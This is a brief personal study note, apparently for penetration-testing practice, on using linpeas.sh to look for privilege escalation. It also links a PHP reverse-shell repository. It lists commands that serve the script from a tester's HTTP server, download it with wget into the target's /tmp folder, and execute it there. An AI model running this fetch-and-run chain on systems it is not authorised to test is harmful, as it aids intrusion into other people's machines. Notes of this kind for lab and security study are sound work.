---
tags:
  - CyberSec/tools
---
- is a tool that hunts for any privilege escalation

https://github.com/pentestmonkey/php-reverse-shell

1. create a server to host the linpeas.sh file
		`sudo python3 -m http.server 80`
2. then put the script in target machine
		put in /tmp folder
		`wget [uri of server (http://192.168.60.4)]/linpeas.sh`
3. execute it
		`chmod +x linpeas.sh` to make it executable
		`./linpeas.sh`\
		